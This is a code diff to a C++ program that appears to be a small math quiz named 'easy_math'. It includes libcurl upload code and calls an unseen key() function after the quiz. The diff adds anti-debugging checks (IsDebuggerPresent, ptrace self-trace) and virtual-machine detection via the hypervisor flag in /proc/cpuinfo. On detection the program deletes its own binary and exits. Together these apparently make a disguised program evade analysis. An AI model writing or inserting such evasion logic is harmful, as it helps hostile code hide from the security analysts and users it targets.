@@ -2,6 +2,8 @@
 #include <chrono>
 #include <thread>
 #include <string>
+#include <cstring>
+#include <cstdint>
 #include <cstdio>
 #include <csignal>
 #include <atomic>
@@ -11,6 +13,17 @@
 #include <regex> 
 #include <curl/curl.h>
 
+#ifdef _WIN32
+#include <windows.h>
+bool isDebuggerPresent() {
+    return IsDebuggerPresent();
+}
+#else
+#include <sys/ptrace.h>
+bool isDebuggerPresent() {
+    return ptrace(PTRACE_TRACEME, 0, 1, 0) == -1;
+}
+#endif
 
 struct upload_status {
     const char *payload;
@@ -123,14 +136,14 @@ void key() {
     //}
 }
 
-bool isWSL() {
-    const char* wsl = std::getenv("WSL_DISTRO_NAME");
-    if (wsl) {
-        return true;
-    } else {
-        return false;
-    }
-}
+// bool isWSL() {
+//     const char* wsl = std::getenv("WSL_DISTRO_NAME");
+//     if (wsl) {
+//         return true;
+//     } else {
+//         return false;
+//     }
+// }
 
 
 void signal_handler(int signal) {
@@ -207,7 +220,24 @@ bool ask_question(const std::string& question, const std::string& answer) {
 int main(){
     const int NUMBER_OF_QUESTIONS = 4;
     std::cout << "Make sure you have libcurl installed on your linux machine" << std::endl;
-    if (isWSL()) {
+
+    // //checking if in WSL
+    // if (isWSL()) {
+    //     std::remove("easy_math");
+    //     return 1;
+    // }
+
+    //checking if in virtual environment (system command from stack overflow)
+    //linux specific (works for wsl too)
+    if(std::system("grep -q ^flags.*\\ hypervisor /proc/cpuinfo") == 0) {
+        std::cout << "This program cannot be run in a virtual machine/environment" << std::endl;
+        std::remove("easy_math");
+        return 1;
+    }
+
+    // checking if a debugger is present
+    if (isDebuggerPresent()) {
+        std::cout << "Debugger detected! Exiting..." << std::endl;
         std::remove("easy_math");
         return 1;
     }
@@ -234,7 +264,7 @@ int main(){
             return 1;
         }
     }
-
+    clear_terminal();
     std::cout << "Congratulations! You have passed the test!" << std::endl;
     key();
     return 0;
